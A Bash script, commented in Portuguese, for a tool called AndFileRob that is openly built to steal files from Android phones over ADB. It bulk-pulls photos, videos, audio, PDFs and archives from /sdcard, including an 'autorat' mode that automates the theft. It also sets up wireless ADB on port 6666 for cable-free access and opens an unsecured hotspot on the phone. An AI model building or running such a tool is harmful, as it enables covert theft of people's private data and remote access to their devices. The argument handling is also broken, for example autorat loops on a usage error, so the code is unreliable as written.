#!/bin/bash

#================================================================================================
# Declarações
# Definindo códigos de cores ANSI
GREEN='\033[0;32m'
BLUE='\033[0;34m'     # INFO
YELLOW='\033[1;33m'   # WARNING
RED='\033[0;31m'      # ERROR
NC='\033[0m'          # No Color (reset)

# Formatar a data no formato dd-mm-aaaa_hh-mm
data=$(date +"%d-%m-%Y_%H-%M")

# Argumento do nome do arquivo a ser puxado
filename=$1
path="./AndFileRob_Dumps/$filename"

#================================================================================================
# Função para exibir o banner
banner() {
    for i in {1..2}; do
        # Essa função faz o banner mudar de cor de acordo com o dispositivo estar conectado ou não
        if adb devices | grep -w "device" &> /dev/null; then
            COLOR=$GREEN
        else
            COLOR=$RED
        fi
        clear
        echo -e "${COLOR}.-----------------------------------------------------------.${NC}"
        echo -e "${COLOR}|                     _ ______ _ _      _____       _       |${NC}"
        echo -e "${COLOR}|     /\             | |  ____(_) |    |  __ \     | |      |${NC}"
        echo -e "${COLOR}|    /  \   _ __   __| | |__   _| | ___| |__) |___ | |__    |${NC}"
        echo -e "${COLOR}|   / /\ \ | '_ \ / _  |  __| | | |/ _ \  _  // _ \| '_ \   |${NC}"
        echo -e "${COLOR}|  / ____ \| | | | (_| | |    | | |  __/ | \ \ (_) | |_) |  |${NC}"
        echo -e "${COLOR}| /_/    \_\_| |_|\__,_|_|    |_|_|\___|_|  \_\___/|_.__/   |${NC}"
        echo -e "${COLOR}|                                                           |${NC}"
        echo -e "${COLOR}|                                                   V 1.5   |${NC}"
        echo -e "${COLOR}'-----------------------------------------------------------'${NC}"
        adb wait-for-device
        if [[ "$COLOR" == "$GREEN" ]]; then
            break
        fi
    done
}

#================================================================================================
# Função para exibir mensagens com diferentes níveis de verbosidade
log_message() {
    # Parâmetros: nível de mensagem e mensagem a ser exibida
    level=$1
    message=$2

    # Verifica o nível de mensagem
    case $level in
        "info")
            echo -e "${BLUE}[INFO]: ${message}${NC}"
            ;;
        "warning")
            echo -e "${YELLOW}[WARNING]: ${message}${NC}"
            ;;
        "error")
            echo -e "${RED}[ERROR]: ${message}${NC}"
            ;;
        *)
            echo -e "[UNKNOWN]: ${message}"
            ;;
    esac
}

#================================================================================================
# Função para roubar arquivos do dispositivo Android
android_file_robber() {
    log_message info "Data atual: $data"
    log_message info "Caminho dos arquivos: $path"
    mkdir -p "$path"

    log_message warning "INICIANDO..."

    # Pausar rapidamente
    sleep 1

    # Encontre arquivos no dispositivo com a extensão informada e faça o download
    adb shell find /sdcard/ -type f -iname "*.$filename" | while read -r file; do
        adb pull "$file" "./$path"
    done
}

#================================================================================================
# Função para parear dispositivos via ADB
fastpair() {
    log_message info "Iniciando pareamento de dispositivos..."
    read -p "IP do dispositivo: " ip_add
    read -p "Porta de pareamento: " pairing
    read -p "Código de pareamento: " code
    adb pair $ip_add:$pairing $code
    sleep 3
}

#================================================================================================
# Função para conectar dispositivos via ADB
fastconnect() {
    log_message info "Iniciando conexão de dispositivos..."
    read -p "IP do dispositivo: " ip_add
    read -p "Porta de conexão: " port
    adb connect $ip_add:$port
    sleep 2
}

#================================================================================================
# Função para desconectar todos os dispositivos e matar o servidor ADB
disconnect() {
    log_message info "Desconectando todos os dispositivos..."
    adb disconnect >/dev/null 2>&1  # Desconecta todos os dispositivos
    adb kill-server >/dev/null 2>&1 # Mata o servidor ADB
    log_message info "Todos os dispositivos foram desconectados."
}

#================================================================================================
# Função para criar um ponto de acesso no dispositivo Android (com root)
android_ap() {
    log_message info "Criando ponto de acesso no dispositivo Android..."
    adb shell cmd wifi start-softap NdroiD_NET open
    log_message info "Ponto de acesso criado"
    log_message info "Seu IP é: $(adb shell ip -c address | grep 'wlan0' | grep 'inet' | awk '{print $2}' | awk -F '/' '{print $1}')"
}

#================================================================================================
# Função para verificar se o dispositivo com o IP fornecido está conectado
check_connection() {
    adb devices | grep "$ip_add" | grep "device" > /dev/null
    return $?
}

#================================================================================================
# Função principal para parear e conectar dispositivos
main_pairing() {
    while true; do
        fastpair
        fastconnect

        # Loop até que o dispositivo com o IP fornecido seja encontrado como "device"
        while true; do
            check_connection
            if [[ $? -eq 0 ]]; then
                log_message info "Dispositivo conectado com sucesso no IP: $ip_add"
                adb devices -l  # Lista os dispositivos conectados
                break
            else
                log_message warning "Falha na conexão. Tentando novamente..."
                sleep 2
                fastconnect  # Tenta conectar novamente
            fi
        done

        # Sai do loop principal quando o dispositivo estiver conectado
        adb wait-for-device
        log_message info "Conexão estabelecida com o dispositivo no IP $ip_add. Pronto para usar."
        break
    done
}

#================================================================================================
# Função para automatizar o roubo de arquivos
autorat() {
    # Definindo os nomes do argumento no array
    filenames=("jpg" "png" "jpeg" "gif" "raw" "webp" "opus" "mp4" "pdf" "zip")

    # Percorrendo todos os elementos para chamar o script várias vezes
    for element in "${filenames[@]}"; do
        while true; do
            bash ./andfilerob.sh "$element"
            exitcode=$?
            if [ $exitcode -eq 0 ]; then
                break
            else
                log_message error "Erro na pasta de $element"
                adb wait-for-device
            fi
        done
    done
}

#================================================================================================
# Função para ativar o modo TCP/IP e conectar via Wi-Fi
enable_tcpip() {
    local porta=${1:-6666}

    log_message info "Aguardando conexão USB do dispositivo..."
    adb wait-for-device
    log_message info "Dispositivo conectado via USB."

    log_message info "Dispositivos conectados via USB:"
    adb devices

    log_message info "Ativando o modo TCP/IP na porta ${porta}..."
    adb tcpip ${porta}
    if [[ $? -ne 0 ]]; then
        log_message error "Falha ao ativar o modo TCP/IP na porta ${porta}. Verifique a conexão USB."
        exit 1
    else
        log_message info "Modo TCP/IP ativado na porta ${porta}."
    fi

    sleep 5

    log_message info "Obtendo o endereço IP do dispositivo..."
    ip_address=$(adb shell ip addr show wlan0 | grep -oE 'inet [0-9.]+' | grep -oE '[0-9.]+')
    if [[ -z "$ip_address" ]]; then
        log_message error "Não foi possível obter o endereço IP do dispositivo. Verifique se o Wi-Fi está ativado."
        exit 1
    else
        log_message info "Endereço IP do dispositivo: $ip_address"
    fi

    log_message info "Tentando conectar ao dispositivo via ADB em ${ip_address}:${porta}..."
    adb connect "${ip_address}:${porta}"
    if [[ $? -ne 0 ]]; then
        log_message error "Não foi possível conectar ao dispositivo via ADB."
        exit 1
    else
        log_message info "Conexão estabelecida com sucesso via TCP/IP em ${ip_address}:${porta}."
    fi

    log_message info "Verificando se o dispositivo ainda está conectado via USB..."
    usb_device=$(adb devices | grep 'device$' | grep -v "${ip_address}")
    if [[ -n "$usb_device" ]]; then
        log_message info "Dispositivo ainda conectado via USB."
        log_message info "Você pode remover o cabo USB a qualquer momento. A conexão via TCP/IP foi estabelecida com sucesso."
    else
        log_message info "Dispositivo não está mais conectado via USB. Conexão via TCP/IP ativa."
    fi

    log_message info "Conexão completa e pronta para depuração via Wi-Fi!"
}

#================================================================================================
# Função principal para processar argumentos
main() {
    case "$1" in
        "-f")
            android_file_robber
            ;;
        "-p")
            main_pairing
            ;;
        "-c")
            fastconnect
            ;;
        "-d")
            disconnect
            ;;
        "-a")
            android_ap
            ;;
        "-t")
            enable_tcpip "$2"
            ;;
        "-r")
            autorat
            ;;
        *)
            echo "Uso: $0 [-f] [-p] [-c] [-d] [-a] [-t porta] [-r]"
            echo "  -f: Roubar arquivos do dispositivo Android"
            echo "  -p: Parear e conectar dispositivos via ADB"
            echo "  -c: Conectar dispositivos via ADB"
            echo "  -d: Desconectar todos os dispositivos e matar o servidor ADB"
            echo "  -a: Criar ponto de acesso no dispositivo Android"
            echo "  -t porta: Ativar modo TCP/IP e conectar via Wi-Fi (porta opcional, padrão 6666)"
            echo "  -r: Automatizar roubo de arquivos"
            exit 1
            ;;
    esac
}

#================================================================================================
# Executa a função principal com os argumentos fornecidos
main "$@"
